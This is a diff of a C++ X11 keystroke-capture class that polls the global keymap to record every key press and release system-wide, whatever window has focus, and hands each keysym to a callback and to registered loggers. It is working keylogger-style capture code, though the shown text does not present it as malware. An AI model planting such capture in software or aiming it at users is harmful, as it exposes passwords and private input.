@@ -36,30 +36,34 @@ void KeystrokeCapturerLinuxX11::_keystrokeListener() {
     char keys[32];
     char lastKeys[32] = {0};
 
-    Window focusWin = 0;
-    int revertToReturn = 0;
-
     while (_threadRun) {
         XQueryKeymap(_display, keys);
 
-        if (memcmp(keys, lastKeys, 32)) {
-            for (int i = 0; i < 32; i++) {
-                char bit = keys[i];
-                char lastBit = lastKeys[i];
-                int check = 1;
+        for (int i = 0; i < 32; i++) {
+            char bit = keys[i];
+            char lastBit = lastKeys[i];
+            int check = 1;
 
-                for (int j = 0 ; j < 8 ; j++) {
-                    if ((bit & check) && !(lastBit & check)) {
-                        int keycode = (i << 3) + j;
+            if (bit == lastBit) {
+                continue;
+            }
 
-                        int keysym = XKeycodeToKeysym(_display, keycode, 0);
-                        char* keystr = XKeysymToString(keysym);
+            for (int j = 0 ; j < 8 ; j++) {
+                if ((bit & check) != (lastBit & check)) {
+                    int keysym = XKeycodeToKeysym(_display, (i << 3) + j, 0);
+                    KeyState state = (bit & check) ? KeyState::Pressed : KeyState::Released;
 
-                        XGetInputFocus(_display, &focusWin, &revertToReturn);
-                        printf("WindowID %x Key: %d %d %s\n", focusWin, keycode, keysym, keystr);
+                    std::cout << keysym << std::endl;
+
+                    if (_callback) {
+                        _callback(keysym, state);
                     }
-                    check <<= 1;
+
+                    for (ILogger* logger : _loggers) {
+                        logger->logKeycode(keysym, state);
+                    }
                 }
+                check <<= 1;
             }
         }
         memcpy(lastKeys, keys, 32);
